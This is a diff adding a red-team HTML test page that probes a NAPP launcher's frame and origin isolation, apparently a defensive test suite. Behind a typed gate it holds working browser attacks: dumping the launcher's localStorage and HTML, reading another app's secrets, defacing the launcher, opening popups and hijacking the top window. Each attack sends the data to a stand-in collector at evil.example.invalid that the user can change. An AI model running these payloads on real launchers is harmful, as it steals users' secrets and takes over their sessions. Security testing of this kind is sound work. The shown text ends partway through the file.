@@ -1,0 +1,930 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-01 frame escape</title>
+<meta name="description" content="Red team: attacks NAPP frame & origin isolation — launcher-origin serving, origin-scheme collisions, top navigation, popups, referrer leaks, frame census. Demo by default; VERY EVIL mode behind a typed gate.">
+<meta name="napp-id" content="evil-01-frame-escape">
+<!--
+  evil-napps ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key on the napp's OWN origin proves
+    the origin grant, nothing more), no network, no signing, no dispatch,
+    no store mutation, no persistence, no destruction.
+  - ONE navigation exception: the ancestor-navigation probe can only detect
+    permission by navigating, so it reloads the launcher at its OWN current
+    URL with a marker hash — reversible, nothing leaves the launcher's URL.
+  - VERY EVIL mode: in-napp arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution,
+    destructive payloads last.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+  #hijack {
+    display: none;
+    background: var(--danger);
+    color: #14060a;
+    font-weight: 700;
+    text-align: center;
+    padding: var(--space-2);
+    flex: 0 0 auto;
+  }
+  #hijack a { color: inherit; }
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="hijack">⚠ THIS PAGE JUST NAVIGATED THE LAUNCHER (window.top) AWAY — you are looking at the evil napp, not the launcher. <a href="about:blank" onclick="history.length > 1 ? history.back() : null; return false">go back</a> if you can.</div>
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened launcher will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-01-frame-escape';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  // If this page ever IS the top-level browsing context, the launcher was
+  // hijacked to it — show the banner (see the hijack row in evil-01).
+  if (window.top === window) document.getElementById('hijack').style.display = 'block';
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function randHex(n) {
+    const b = new Uint8Array(n / 2);
+    crypto.getRandomValues(b);
+    return Array.from(b).map(x => x.toString(16).padStart(2, '0')).join('');
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  // NAPP context: instance id (window.name), the granted bridge surface,
+  // origin/position — captured once for every probe and the report.
+  function bridgePresence() {
+    return {
+      instance: safeGet(() => window.name) || null,
+      nostr: !!findNostr(),
+      nostrdb: typeof window.nostrdb === 'object',
+      napp: typeof window.napp === 'object',
+    };
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      parentLength: safeGet(() => window.parent.length),
+      bridge: bridgePresence(),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — launcher/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function postTop(msg) { window.top.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { cleanup(); resolve('timeout'); }, ms);
+    });
+  }
+  // A bridge rpc with the napp dialect this suite speaks (mirrors the
+  // reference bridge.js): a postMessage envelope tagged __nostrapps:"rpc".
+  function bridgeRpc(method, params) {
+    const id = 'evil-rpc-' + randId();
+    const p = waitForMsg(id, 4000);
+    postParent({
+      __nostrapps: 'rpc', id: id, method: method,
+      params: params, instanceId: window.name,
+    });
+    return p;
+  }
+  // sessionStorage flag that survives a launcher reload at this origin —
+  // used by probes that must navigate to detect (see top-nav row).
+  const NAV_FLAG = '__evil01_navprobe__';
+  function navProbeFlag() { try { return sessionStorage.getItem(NAV_FLAG); } catch (_) { return null; } }
+  function setNavProbeFlag() { try { sessionStorage.setItem(NAV_FLAG, new Date().toISOString()); } catch (_) {} }
+  function clearNavProbeFlag() { try { sessionStorage.removeItem(NAV_FLAG); } catch (_) {} }
+
+  // evil-01 — frame & origin isolation (tier 0). NAPP.md says each napp runs at
+// its own origin in a sandboxed iframe, that window.parent is cross-origin,
+// and that "the bridge is its only channel to the launcher" — but none of
+// that is protocol; it is all launcher policy. These probes attack every
+// isolation *must* a launcher can get wrong, with real payloads behind the gate.
+window.__EVIL_KIT__ = [
+  {
+    label: 'origin-collision nappId pair (naive slug scheme)',
+    note: 'Origin derivation is launcher policy, not protocol. The reference retired its first scheme because `a~b` and `a-b` sanitized to one label and served each other\'s files. Under any slug-of-the-id scheme this id pair collides into ONE origin: the victim\'s localStorage, IndexedDB, files and service worker all become the attacker\'s.',
+    data: {
+      victimNappId: 'evil-01-frame-escape',
+      evilNappId: 'evil~01~frame~escape',
+      bothSlugTo: 'evil-01-frame-escape',
+    },
+  },
+];
+
+// The top-nav probe's once-per-document latch: a relaunched frame must never
+// navigate again (its referrer/sessionStorage signals come first) — no loop.
+let navAttempted = false;
+
+const ATTACKS = [
+  {
+    id: 'launcher-origin',
+    name: 'launcher-origin equivalence',
+    target: 'NAPP.md: "window.parent is cross-origin" — never serve napp bytes from the launcher\'s own origin',
+    severity: 'critical',
+    harm: 'A napp served from the launcher\'s origin reads the launcher\'s DOM and localStorage — permission grants, remembered sign/publish decisions, open-window state — and can script every other napp frame. The bridge becomes irrelevant: full launcher compromise.',
+    evilBrief: 'Dumps EVERY key/value of the launcher\'s localStorage (including the harness canary nsec and fake grant record), copies the launcher document (first 4KB), injects a red "EVIL NAPP EXECUTED HERE" banner into the launcher DOM (visible, easy to clean), and POSTs everything to the collector.',
+    async demo() {
+      let title = null;
+      try {
+        title = window.parent.document.title;
+      } catch (e) {
+        return blocked('window.parent.document threw: ' + errMsg(e).slice(0, 90) + ' — launcher origin held, parent is cross-origin');
+      }
+      let ls = 0;
+      try { ls = window.parent.localStorage.length; } catch (_) {}
+      return armed(
+        'parent document READABLE (title: ' + mask(title, 24) + ') — the napp runs at the launcher\'s own origin; ' +
+        ls + ' launcher localStorage key(s) one step away (grants, decisions, state)'
+      );
+    },
+    async evil() {
+      const out = {};
+      try {
+        const p = window.parent;
+        const data = {};
+        const ls = p.localStorage;
+        for (let i = 0; i < ls.length; i++) { const k = ls.key(i); data[k] = ls.getItem(k); }
+        out.launcherLocalStorage = data;
+        out.launcherLocalStorageKeys = Object.keys(data);
+        out.launcherTitle = p.document.title;
+        out.launcherHTML = p.document.documentElement.outerHTML.slice(0, 4096);
+        const el = p.document.createElement('div');
+        el.id = '__evil01_pwned_banner__';
+        el.textContent = '⚠ EVIL NAPP EXECUTED HERE — frame escape proof ' + new Date().toISOString();
+        el.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#b007;color:#fff;font:700 13px ui-monospace,monospace;padding:6px;text-align:center';
+        p.document.body && p.document.body.appendChild(el);
+        out.defacedLauncher = true;
+      } catch (e) { out.error = 'denied: ' + errMsg(e); }
+      out.exfil = await sendToCollector('launcher-origin-theft', {
+        keys: out.launcherLocalStorageKeys,
+        sample: out.launcherLocalStorage,
+        html: out.launcherHTML ? out.launcherHTML.length + ' chars' : null,
+      });
+      return out;
+    },
+  },
+  {
+    id: 'origin-collision',
+    name: 'cross-napp origin collision',
+    target: 'NAPP.md never specifies origin derivation — a naive label scheme collides napps into one origin',
+    severity: 'critical',
+    harm: 'Two napps whose ids slug to one origin share everything: localStorage, IndexedDB, service worker, and the launcher\'s message demux. The attacker reads the victim\'s persisted secrets, and any file/bytes the victim installs are served to the attacker\'s frames too.',
+    evilBrief: 'Reads the victim app\'s persisted secret (seeded by the harness) and every other key at this shared origin, and POSTs them in full to the collector.',
+    async demo() {
+      let v = null;
+      try { v = localStorage.getItem('__victim_secret__'); } catch (e) {
+        return blocked('localStorage unreachable at this origin: ' + errMsg(e).slice(0, 90));
+      }
+      if (v != null) {
+        return armed(
+          'victim secret READABLE at my origin: ' + mask(v, 10) + ' — my origin is the victim\'s origin ' +
+          '(label collision: the launcher derived one origin for two nappIds)'
+        );
+      }
+      let n = 0;
+      try { n = localStorage.length; } catch (_) {}
+      return blocked('own origin only — no victim residue here (' + n + ' key(s), none foreign). Origin derivation held: one origin per napp.');
+    },
+    async evil() {
+      const out = {};
+      try {
+        const data = {};
+        for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); data[k] = localStorage.getItem(k); }
+        out.sharedOriginStorage = data;
+        out.victimSecret = data['__victim_secret__'] || null;
+      } catch (e) { out.error = 'denied: ' + errMsg(e); }
+      out.exfil = await sendToCollector('origin-collision-theft', { storage: out.sharedOriginStorage });
+      return out;
+    },
+  },
+  {
+    id: 'popup',
+    name: 'popup escape',
+    target: 'the sandbox must not permit popups (no allow-popups)',
+    severity: 'high',
+    harm: 'window.open creates a browsing context outside every frame and every origin CSP — an exfiltration and phishing channel the launcher cannot observe or police.',
+    evilBrief: 'Opens a REAL popup at the collector URL with a captured summary (origin, instance id, referrer, bridge surface) in the query string.',
+    async demo() {
+      let w = null;
+      try { w = window.open('about:blank'); } catch (e) {
+        return blocked('window.open() threw: ' + errMsg(e).slice(0, 90) + ' — popups held by the sandbox');
+      }
+      if (!w) return blocked('window.open() returned null — popups held by the sandbox');
+      try { w.close(); } catch (_) { /* ignore */ }
+      return armed('window.open() succeeded — popup channel open (probe window closed immediately)');
+    },
+    async evil() {
+      const url = state.collector + '?ev=popup-exfil&payload=' + encodeURIComponent(captureSummary());
+      let w = null;
+      try { w = window.open(url); } catch (e) { return { attempted: url, result: errMsg(e) }; }
+      return { attempted: url, opened: !!w };
+    },
+  },
+  {
+    id: 'referrer',
+    name: 'referrer leak',
+    target: 'NAPP.md is silent on Referrer-Policy — the napp document sees the launcher URL',
+    severity: 'high',
+    harm: 'document.referrer inside the napp carries the launcher URL — including share-link action payloads (?action=…&payload=…) — unless the launcher serves the napp HTML with a strict policy. Every napp learns what the launcher was asked to open.',
+    evilBrief: 'Reads document.referrer (the launcher URL and its query) and POSTs it to the collector.',
+    async demo() {
+      const r = document.referrer;
+      if (!r) return na('document.referrer is empty — nothing leaked');
+      if (/[?#]/.test(r)) {
+        return armed('referrer leaks the launcher URL AND its payload: ' + mask(r, 52));
+      }
+      return na('referrer is origin-only: ' + mask(r, 32) + ' — the default strict policy held the launcher\'s URL and share payload back (leak the full URL by serving napp HTML with a leaky Referrer-Policy)');
+    },
+    async evil() {
+      const out = { referrer: document.referrer };
+      out.exfil = await sendToCollector('referrer', out);
+      return out;
+    },
+  },
+  {
+    id: 'frame-census',
+    name: 'frame census & sibling scriptability',
+    target: 'cross-origin Window accessibles — parent.length and parent.frames are always readable',
+    severity: 'high',
+    harm: 'Any napp can count the launcher\'s frames (other napps, hidden boot frames) from any origin — a composition side channel NAPP.md never mentions. Under an origin mistake the census becomes full sibling access: DOM, storage, and the sibling\'s bridge identity.',
+    evilBrief: 'Counts the launcher\'s frames and siblings, attempts scripting on every sibling frame, and POSTs the census to the collector.',
+    async demo() {
+      let n = null;
+      try { n = window.parent.length; } catch (e) { return blocked(errMsg(e)); }
+      // classify every sibling: scriptable (same-origin with me) vs held.
+      // Own-origin boot frames are scriptable BY DESIGN (the launcher keeps
+      // the boot frame at the napp's own origin) — that is why the boot
+      // channel must sender-check. Anything else scriptable is another NAPP.
+      const boots = [];
+      const nappSiblings = [];
+      let held = 0;
+      try {
+        for (let i = 0; i < window.parent.frames.length; i++) {
+          try {
+            const fr = window.parent.frames[i];
+            if (fr === window) continue;
+            const d = fr.document;
+            const title = (d && (d.title || '')) || 'untitled';
+            if (/napp boot/i.test(title)) boots.push(title);
+            else nappSiblings.push(title + ' @ ' + (d.location && d.location.href || '?'));
+          } catch (_) { held++; /* cross-origin sibling: held */ }
+        }
+      } catch (e) { /* parent.frames unreachable */ }
+      const parts = ['parent.length = ' + n + ' — ' + held + ' held cross-origin, ' + boots.length + ' scriptable boot frame(s), ' + nappSiblings.length + ' scriptable NAPP sibling(s)'];
+      if (nappSiblings.length > 0) {
+        return armed(
+          nappSiblings.length + ' NAPP sibling frame(s) SCRIPTABLE — same-origin with me: ' +
+          nappSiblings.slice(0, 3).map(t => mask(t, 24)).join(', ') +
+          ' (their DOM, storage and bridge identity are mine). ' + parts[0] +
+          ' — an origin mistake gave me other napps, not just my own boot frames'
+        );
+      }
+      if (n > 1) {
+        return armed(
+          'frame census open: ' + parts[0] +
+          (boots.length ? ' — the boot frames are my OWN origin (by design: the launcher boots each napp at its origin), scriptable by me; the boot channel must therefore sender-check (see evil-03). ' : '') +
+          'The counting channel itself is open from any origin (NAPP.md is silent on it).'
+        );
+      }
+      return na('parent.length = ' + n + ' — alone in the launcher; the census channel exists but has nothing to count');
+    },
+    async evil() {
+      const out = { parentLength: safeGet(() => window.parent.length) };
+      out.scriptableTitles = [];
+      try {
+        for (let i = 0; i < window.parent.frames.length; i++) {
+          try {
+            const d = window.parent.frames[i].document;
+            if (d) out.scriptableTitles.push(d.title || d.location.href || 'untitled');
+          } catch (_) {}
+        }
+      } catch (_) {}
+      out.exfil = await sendToCollector('frame-census', out);
+      return out;
+    },
+  },
+  {
+    id: 'origin-storage',
+    name: 'per-origin storage granted',
+    target: 'NAPP.md: "Each napp has its own origin, so localStorage is its own" — authority by design',
+    severity: 'info',
+    harm: 'Not a misconfig: the NAPP model GRANTS every napp persistent, launcher-scoped storage forever (until uninstall). This row proves the channel; evil-07 weaponizes it for persistence that survives launcher reloads.',
+    evilBrief: 'Writes a persistent marker key __evil01_origin_pwned__ to the napp\'s own origin (survives launcher reloads until you wipe the app) and POSTs the key list to the collector. The demo cleaned its marker up; this one does not.',
+    async demo() {
+      const key = '__evil01_probe__' + randId();
+      const notes = [];
+      try {
+        localStorage.setItem(key, '1');
+        const v = localStorage.getItem(key);
+        localStorage.removeItem(key);
+        if (v === '1') notes.push('localStorage');
+      } catch (e) { notes.push('localStorage denied: ' + errMsg(e).slice(0, 60)); }
+      try {
+        const ok = await withTimeout(new Promise((res, rej) => {
+          const r = indexedDB.open('__evil01_probe__');
+          r.onsuccess = () => { try { r.result.close(); } catch (_) {} res(1); };
+          r.onerror = () => rej(r.error || new Error('idb error'));
+        }), 2000);
+        if (ok === 1) notes.push('indexedDB');
+      } catch (e) { notes.push('indexedDB denied: ' + errMsg(e).slice(0, 60)); }
+      if (notes.some(n => /denied/.test(n) === false)) {
+        return armed('BY DESIGN: persistent per-origin storage granted (' + notes.filter(n => !/denied/.test(n)).join(', ') + ') — marker key written+cleaned to prove it. This channel is the launcher\'s to police (wipe on uninstall), not the protocol\'s.');
+      }
+      return blocked(notes.join(' | '));
+    },
+    async evil() {
+      const out = {};
+      try {
+        localStorage.setItem('__evil01_origin_pwned__', new Date().toISOString());
+        out.persistedMarker = '__evil01_origin_pwned__ written to my origin (wipe me to remove it)';
+        const keys = [];
+        for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
+        out.keys = keys;
+      } catch (e) { out.error = errMsg(e); }
+      out.exfil = await sendToCollector('origin-persist', { keys: out.keys });
+      return out;
+    },
+  },
+  {
+    id: 'top-nav',
+    name: 'ancestor navigation (shell hijack)',
+    target: 'the sandbox must never permit top navigation (no allow-top-navigation, no missing sandbox)',
+    severity: 'critical',
+    destructive: true,
+    harm: 'window.top.location.replace() navigates the whole launcher away — every open napp, all launcher state, gone. The shell is replaced by attacker content in what was a trusted tab.',
+    evilBrief: 'Calls window.top.location.replace(collector?ev=shell-hijack&payload=…) — THE LAUNCHER TAB LEAVES FOR THE COLLECTOR AND THIS FRAME IS DESTROYED. Runs LAST so the log above survives. The launcher tab shows the collector\'s error page.',
+    async demo() {
+      // The only way to detect ancestor-navigation permission is to navigate.
+      // A previous probe already did: the marker QUERY PARAM (referrers never
+      // carry fragments, but they do carry query strings) or the sessionStorage
+      // flag proves the launcher reloaded at a napp's command. Checked FIRST
+      // so a relaunched frame never navigates again — no reload loop.
+      if (/[?&]evil01nav=1/.test(document.referrer || '')) {
+        clearNavProbeFlag();
+        return armed('ancestor navigation PERMITTED — my referrer carries the probe\'s marker param: a previous probe replaced the launcher\'s location, the launcher reloaded at my command and relaunched me (this is the relaunched frame)');
+      }
+      const flag = navProbeFlag();
+      if (flag) {
+        clearNavProbeFlag();
+        return armed('ancestor navigation PERMITTED — a previous probe run at ' + flag + ' replaced the launcher\'s location and the launcher reloaded at my command (this is the relaunched frame)');
+      }
+      // Same-origin with top: navigation is trivially permitted (and readable).
+      try {
+        const h = window.top.location.href;
+        return armed('window.top.location READABLE (same-origin with the launcher): ' + mask(h, 48) + ' — top is mine to navigate');
+      } catch (_) { /* cross-origin: held, as it should be */ }
+      if (navAttempted) {
+        return na('this document already issued its one navigation probe and no cross-reload signal came back — cannot confirm without executing; use VERY EVIL mode to test the channel for real');
+      }
+      // Cross-origin: attempt the documented ROE-exception probe — ONCE per
+      // document — reload the launcher at its OWN current URL with a marker
+      // query param. Reversible; if the sandbox holds, replace() throws.
+      navAttempted = true;
+      let base = null;
+      try { base = (document.referrer || '').split('#')[0]; } catch (_) {}
+      if (!base || !/^https?:/.test(base)) {
+        try {
+          const ao = location.ancestorOrigins;
+          const topOrigin = ao && ao[ao.length - 1];
+          if (topOrigin) base = topOrigin + '/';
+        } catch (_) {}
+      }
+      if (!base) return na('no launcher URL derivable (referrer empty, ancestorOrigins unavailable) — cannot attempt the probe');
+      const target = base + (base.includes('?') ? '&' : '?') + 'evil01nav=1';
+      setNavProbeFlag();
+      try {
+        window.top.location.replace(target);
+        return armed('top.location.replace() ISSUED toward the launcher\'s own URL with a marker param — if the launcher reloads with ?evil01nav=1, the channel is open (see the relaunched frame)');
+      } catch (e) {
+        clearNavProbeFlag();
+        return blocked('top.location.replace() threw: ' + errMsg(e).slice(0, 100) + ' — ancestor navigation held');
+      }
+    },
+    async evil() {
+      const url = state.collector + '?ev=shell-hijack&payload=' + encodeURIComponent(captureSummary());
+      const out = { attempted: url };
+      try {
+        window.top.location.replace(url);
+        out.result = 'navigation issued — if the launcher is still here it was held; otherwise you are reading the collector error page';
+      } catch (e) { out.result = 'denied: ' + errMsg(e); }
+      return out;
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
